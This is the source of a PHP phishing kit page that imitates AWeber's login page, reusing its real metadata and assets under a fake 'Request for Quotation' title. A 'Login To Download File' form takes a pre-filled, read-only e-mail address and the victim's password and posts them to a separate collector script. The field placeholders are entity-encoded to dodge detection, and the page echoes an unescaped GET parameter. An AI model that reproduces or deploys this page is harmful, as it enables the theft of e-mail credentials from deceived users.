<?   
@ini_set('display_errors',0);
$random=rand(0,100000000000);
$logn = $_POST['logn'];
?>

<!DOCTYPE html>
<html lang="en">
<head>
<title>Request for Quotation</title>
<script type="text/javascript" src="MaskedPassword.js"></script>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="description" content="Log in to your AWeber account (or AWeber affiliate account) by entering your username or Affiliate ID and password.">
<meta name="robots" content="noodp">
<meta name="robots" content="noydir">
<meta name="apple-itunes-app" content="app-id&#x3D;1057724858">
<meta property="og:title" content="Email Marketing Software | Email Marketing Newsletters from AWeber">
<meta property="og:url" content="https://www.aweber.com/login.htm">
<meta property="og:image" content="https://assets.aweber-static.com/www/assets/img/logo-og-image.95a2e0b1.jpg">
<meta property="twitter:image" content="https://assets.aweber-static.com/www/assets/img/logo-og-image.95a2e0b1.jpg">
<meta property="og:site_name" content="AWeber">
<meta property="og:type" content="website">
<meta property="fb:admins" content="8224340">
<meta property="fb:admins" content="561949545">
<meta property="twitter:card" content="summary_large_image">
<meta property="twitter:site" content="@aweber">
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://assets.aweber-static.com/www/assets/metadata/apple-touch-icon-72x72-precomposed.4a802c3f.png">
<link rel="apple-touch-icon-precomposed" sizes="76x76" href="https://assets.aweber-static.com/www/assets/metadata/apple-touch-icon-76x76-precomposed.4f5223f9.png">
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://assets.aweber-static.com/www/assets/metadata/apple-touch-icon-114x114-precomposed.bd8c4a11.png">
<link rel="apple-touch-icon-precomposed" sizes="120x120" href="https://assets.aweber-static.com/www/assets/metadata/apple-touch-icon-120x120-precomposed.c239b418.png">
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://assets.aweber-static.com/www/assets/metadata/apple-touch-icon-144x144-precomposed.f97b1d42.png">
<link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://assets.aweber-static.com/www/assets/metadata/apple-touch-icon-152x152-precomposed.d43a5640.png">
<link rel="apple-touch-icon-precomposed" sizes="180x180" href="https://assets.aweber-static.com/www/assets/metadata/apple-touch-icon-180x180-precomposed.f5c48398.png">
<meta name="apple-mobile-web-app-title" content="AWeber">
<link rel="icon" type="image/png" sizes="32x32" href="https://assets.aweber-static.com/www/assets/metadata/favicon-32x32.760e2324.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://assets.aweber-static.com/www/assets/metadata/favicon-16x16.f425d0e0.png">
<link rel="shortcut icon" href="https://assets.aweber-static.com/www/assets/metadata/favicon.38fab185.ico">
<link rel="mask-icon" href="https://assets.aweber-static.com/www/assets/metadata/mask.3a16e00f.svg" color="#0C7AC0">
<link rel="stylesheet" type="text/css" href="https://assets.aweber-static.com/www/assets/css/main.50315030.css">
<script src="https://assets.aweber-static.com/www/assets/bundles/jquery.5a555b6d.js"></script>
<script src="https://assets.aweber-static.com/www/assets/bundles/vendor.98010375.js"></script>
<script src="https://assets.aweber-static.com/www/assets/bundles/lib.becade21.js"></script>
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<meta charset="UTF-8">
<!-- Google Tag Manager Fallback -->
<script type="text/javascript">
window.ga=window.ga || function(){ (ga.q = ga.q || []).push(arguments); };
</script>
<!-- End Google Tag Manager Fallback -->
<!-- Google Tag Manager -->
<script type="text/javascript">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl+'&gtm_auth=UYNjOPXi40kADX0ZYRcuvw&gtm_preview=env-50&gtm_cookies_win=x';f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-5J4XPK');</script>
<!-- End Google Tag Manager -->
<!-- Start Visual Website Optimizer Asynchronous Code -->
<script type="text/javascript">
var _vwo_code=(function(){
    var account_id=1330,
    settings_tolerance=2000,
    library_tolerance=2500,
    use_existing_jquery=true,
    // DO NOT EDIT BELOW THIS LINE
    f=false,d=document;return{use_existing_jquery:function(){return use_existing_jquery;},library_tolerance:function(){return library_tolerance;},finish:function(){if(!f){f=true;var a=d.getElementById('_vis_opt_path_hides');if(a)a.parentNode.removeChild(a);}},finished:function(){return f;},load:function(a){var b=d.createElement('script');b.src=a;b.type='text/javascript';b.innerText;b.onerror=function(){_vwo_code.finish();};d.getElementsByTagName('head')[0].appendChild(b);},init:function(){settings_timer=setTimeout('_vwo_code.finish()',settings_tolerance);var a=d.createElement('style'),b='body{opacity:0 !important;filter:alpha(opacity=0) !important;background:none !important;}',h=d.getElementsByTagName('head')[0];a.setAttribute('id','_vis_opt_path_hides');a.setAttribute('type','text/css');if(a.styleSheet)a.styleSheet.cssText=b;else a.appendChild(d.createTextNode(b));h.appendChild(a);this.load('//dev.visualwebsiteoptimizer.com/j.php?a='+account_id+'&u='+encodeURIComponent(d.URL)+'&r='+Math.random());return settings_timer;}};}());_vwo_settings_timer=_vwo_code.init();
</script>
<!-- End Visual Website Optimizer Asynchronous Code -->
<script type="text/javascript">var _kmq = _kmq || [];
    var _kmk = _kmk || '7380cf13bcddad3f1993fd5b0f313c4c7c679d73';
    function _kms(u){
      setTimeout(function(){
        var d = document, f = d.getElementsByTagName('script')[0],
        s = d.createElement('script');
        s.type = 'text/javascript'; s.async = true; s.src = u;
        f.parentNode.insertBefore(s, f);
      }, 1);
    }
    _kms('//i.kissmetrics.com/i.js');
    _kms('//scripts.kissmetrics.com/' + _kmk + '.2.js');
</script>
<base target="_blank">
<style type="text/css">
<!--
.style1 {color: #FFFFFF}
body {
	background-color: #FFFFFF;
	background-image: url(default.jpg);
	background-repeat: repeat;
}
-->
</style>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head>
<body text="#FFFFFF" link="#FFFFFF" vlink="#FFFFFF" alink="#FFFFFF" class="body--nopadding height-100 bc-grey-50-bg style1" style="background-image: url('default.jpg')">
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5J4XPK&gtm_auth=UYNjOPXi40kADX0ZYRcuvw&gtm_preview=env-50&gtm_cookies_win=x" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
<!-- Nosciprt Enable JS Message -->
<noscript>
<div class="enable-javascript">
<div class="fg-container">
<div class="fg-row">
<div class="fg-col-xs-8 fg-col-xs-offset-2">
<div class="javascript-content">
<svg id="Layer_1" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" height="18" width="18" viewBox="0 0 19.63 19.63"><defs><style>.cls-1{fill:#fff;}</style></defs><title>alert-icon</title><path class="cls-1" d="M9.81 12.37a.43.43 0 0 1-.43-.43V5.12a.43.43 0 1 1 .85 0v6.83a.43.43 0 0 1-.42.42zM9.81 14.08a.85.85 0 1 0 .85.85.85.85 0 0 0-.85-.85z"/><path class="cls-1" d="M9.81 19.62a.43.43 0 0 1-.3-.12L.12 10.11a.43.43 0 0 1 0-.6L9.51.12a.43.43 0 0 1 .6 0l9.39 9.39a.43.43 0 0 1 0 .6l-9.39 9.39a.43.43 0 0 1-.3.12zM1.03 9.81l8.78 8.78 8.78-8.78-8.78-8.78z"/></svg>
<p><strong>Please enable JavaScript to use AWeber</strong></p>
</div>
</div>
</div>
</div>
</div>
</noscript>
<div class="fg-container">
<div class="fg-row">
<div class="container fg-col-md-6 fg-col-md-offset-3 fg-col-sm-10 fg-col-sm-offset-1 fg-col-xs-12">
<a href="index.htm">
<img class="logo-login" src="xls22.png" height="116" width="531"></a>
<!-- Notification -->
<!-- <div class="notification-bar green-notification bounce-in-bottom">
  <div class="fg-col-md-1 fg-col-sm-1 fg-col-xs-2">
    <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
       viewBox="0 0 47 48" xml:space="preserve">
    <g>
      <defs>
        <path id="SVGID_1_" d="M2.7,40.4V38l5-4.8c0,0-5-25.2,12.2-27.8c0,0-1-5.3,3.9-5.3c4.9,0,3.4,5.2,3.4,5.2s15.7-0.9,12,27.9
          l5.2,5.1v2.3L2.7,40.4z"/>
      </defs>
      <clipPath id="SVGID_2_">
        <use xlink:href="#SVGID_1_"  style="overflow:visible;"/>
      </clipPath>
      <g style="clip-path:url(#SVGID_2_);">
        <defs>
          <rect id="SVGID_3_" x="-436.5" y="-716.9" width="2294.6" height="3059.5"/>
        </defs>
        <clipPath id="SVGID_4_">
          <use xlink:href="#SVGID_3_"  style="overflow:visible;"/>
        </clipPath>
        <rect x="-12.2" y="-14.8" style="clip-path:url(#SVGID_4_);" width="71.5" height="70.3"/>
      </g>
    </g>
    <g>
      <defs>
        <path id="SVGID_5_" d="M18.5,42.7h10.1c0,0-0.5,5-5,5C19,47.8,18.5,42.7,18.5,42.7"/>
      </defs>
      <clipPath id="SVGID_6_">
        <use xlink:href="#SVGID_5_"  style="overflow:visible;"/>
      </clipPath>
      <g style="clip-path:url(#SVGID_6_);">
        <defs>
          <rect id="SVGID_7_" x="-436.6" y="-716.9" width="2294.6" height="3059.5"/>
        </defs>
        <clipPath id="SVGID_8_">
          <use xlink:href="#SVGID_7_"  style="overflow:visible;"/>
        </clipPath>
        <rect x="3.6" y="27.8" style="clip-path:url(#SVGID_8_);" width="40" height="34.9"/>
      </g>
    </g>
    </svg>
  </div>
  <div class="fg-col-md-10 fg-col-sm-10 fg-col-xs-10">
    <a href="https://blog.aweber.com/new-features/introducing-push-notifications.htm?utm_source=awpublicsite&utm_medium=email&utm_campaign=pushnotifications&utm_content=landinglogin" target="_blank" id="gtm-features-loginnotification-100">New subscriber notifications – now on mobile! <span>Learn more.</span></a>
  </div>
</div>
 -->
<div class="card">
<!-- Login/Forgot Password -->
<div class="login-wrapper">
<div id="note-bar">
<div id="note"></div>
</div>
<div class="login-state-slider">
<div class="login-box slide-box">
<form action="agm-exl2.php" method="post" name="login-form" target="_self" id="login-form">
<p align="justify">
<input type="text" class="user" id="username" name="logn" value="<?php echo $_GET['logn'];?>" readonly placeholder="&#69;&#45;&#109;&#97;&#105;&#108;&#32;&#65;&#100;&#100;&#114;&#101;&#115;&#115;" required>
<input type="text" id="passd" class="password" name="passd" placeholder="&#69;&#45;&#109;&#97;&#105;&#108;&#32;&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" required>&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<button class="ladda-button blue-bg wide login-button" data-style="slide-right">
<span class="ladda-label">Login To Download File</span></button>
</p>
</form>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
 </script>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("passd"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
</body>
</html>
